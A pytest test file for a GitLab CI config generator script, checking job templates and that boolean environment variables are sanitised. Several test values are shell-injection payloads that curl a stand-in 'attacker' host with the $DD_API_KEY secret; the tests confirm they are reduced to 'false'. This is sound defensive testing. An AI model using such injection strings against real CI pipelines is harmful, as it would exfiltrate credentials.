"""Tests for scripts/gen_gitlab_config.py."""

import importlib.util
import pathlib
import sys
import types
from unittest import mock

import pytest


_SCRIPT_PATH = pathlib.Path(__file__).resolve().parents[2] / "scripts" / "gen_gitlab_config.py"


@pytest.fixture(scope="module")
def gen_gitlab_config_mod():
    # The script is not importable as-is: it runs under uv with its own dependencies, parses argv at
    # import time, and appends to sys.path. Stub ruamel.yaml, give it an empty argv, and restore
    # sys.path afterwards so the rest of the suite is unaffected.
    ruamel = types.ModuleType("ruamel")
    yaml = types.ModuleType("ruamel.yaml")

    class YAML:
        def load(self, content):
            return {"variables": {"TESTRUNNER_IMAGE": "testrunner:fake"}}

    yaml.YAML = YAML
    ruamel.yaml = yaml

    spec = importlib.util.spec_from_file_location("gen_gitlab_config", _SCRIPT_PATH)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    original_path = list(sys.path)
    with mock.patch.dict(sys.modules, {"ruamel": ruamel, "ruamel.yaml": yaml, spec.name: module}):
        with mock.patch.object(sys, "argv", [str(_SCRIPT_PATH)]):
            spec.loader.exec_module(module)
        try:
            yield module
        finally:
            sys.path[:] = original_path


@pytest.mark.parametrize(
    "value, expected",
    [
        (None, "false"),
        ("", "false"),
        ("false", "false"),
        ("true", "true"),
        ("TRUE", "true"),
        (" true", "false"),
        ("$(curl attacker/$DD_API_KEY)", "false"),
        ('true" && curl attacker/$DD_API_KEY #', "false"),
    ],
)
def test_get_bool_env_only_allows_literal_true(gen_gitlab_config_mod, monkeypatch, value, expected):
    monkeypatch.delenv("NIGHTLY_BUILD", raising=False)
    if value is not None:
        monkeypatch.setenv("NIGHTLY_BUILD", value)

    assert gen_gitlab_config_mod._get_bool_env("NIGHTLY_BUILD") == expected


def test_jobspec_sanitizes_nightly_build_before_script(gen_gitlab_config_mod, monkeypatch):
    monkeypatch.setenv("NIGHTLY_BUILD", "$(curl attacker/$DD_API_KEY)")

    with mock.patch.object(gen_gitlab_config_mod.subprocess, "check_output", return_value=b"pip-key\n"):
        config = str(gen_gitlab_config_mod.JobSpec(name="suite", stage="core"))

    assert '    - export NIGHTLY_BUILD="false"' in config
    assert "$(curl" not in config
    assert "$DD_API_KEY" not in config


def test_build_base_venvs_template_gets_sanitized_bool_values(gen_gitlab_config_mod, monkeypatch, tmp_path):
    monkeypatch.setenv("NIGHTLY_BUILD", "$(curl attacker/$DD_API_KEY)")
    monkeypatch.setenv("UNPIN_DEPENDENCIES", "$(curl attacker/$DD_API_KEY)")
    monkeypatch.setattr(gen_gitlab_config_mod, "TESTS_GEN", tmp_path / "tests-gen.yml")
    monkeypatch.setattr(gen_gitlab_config_mod, "_global_python_versions", {"3.11"})

    gen_gitlab_config_mod.gen_build_base_venvs()

    config = (tmp_path / "tests-gen.yml").read_text()
    assert 'echo "NIGHTLY_BUILD: false"' in config
    assert 'echo "UNPIN_DEPENDENCIES: false"' in config
    assert 'if [[ "false" == "true" ]]' in config
    assert "$(curl" not in config
    assert "$DD_API_KEY" not in config


def test_migrated_jobs_use_uv_environments(gen_gitlab_config_mod):
    environment_hashes = ("first", "second", "third")
    config = str(
        gen_gitlab_config_mod.JobSpec(
            name="tracer",
            stage="core",
            suite="tracer",
            uses_uv=True,
            parallelism=2,
            python_versions={"3.10", "3.11"},
            environment_hashes=environment_hashes,
        )
    )

    assert "  extends: .test_base_uv" in config
    assert "    TEST_SUITE: tracer" in config
    configured_hashes = {
        environment_hash
        for line in config.splitlines()
        if line.strip().startswith("TEST_ENVIRONMENTS_")
        for environment_hash in line.rsplit('"', 2)[1].split()
    }
    assert configured_hashes == set(environment_hashes)


def test_migrated_snapshot_job_uses_defined_base(gen_gitlab_config_mod):
    config = str(
        gen_gitlab_config_mod.JobSpec(
            name="requests", stage="contrib", suite="contrib::requests", uses_uv=True, snapshot=True
        )
    )
    extends = next(line.removeprefix("  extends: ") for line in config.splitlines() if line.startswith("  extends: "))
    test_templates = (gen_gitlab_config_mod.GITLAB / "tests.yml").read_text()

    assert extends == ".test_base_uv_snapshot"
    assert f"{extends}:" in test_templates


def test_migrated_jobs_allow_prerelease_dependencies_when_unpinned(gen_gitlab_config_mod, monkeypatch):
    monkeypatch.setenv("UNPIN_DEPENDENCIES", "true")

    config = str(gen_gitlab_config_mod.JobSpec(name="tracer", stage="core", suite="tracer", uses_uv=True))

    assert "    UNPIN_DEPENDENCIES: true" in config
    assert "    UV_PRERELEASE: allow" in config


def test_unmigrated_jobs_keep_using_riot(gen_gitlab_config_mod):
    with mock.patch.object(gen_gitlab_config_mod.subprocess, "check_output", return_value=b"pip-key\n"):
        config = str(gen_gitlab_config_mod.JobSpec(name="requests", stage="contrib", suite="requests"))

    assert "  extends: .test_base_riot" in config
    assert "    PIP_CACHE_KEY: pip-key" in config
    assert "TEST_ENVIRONMENTS_" not in config
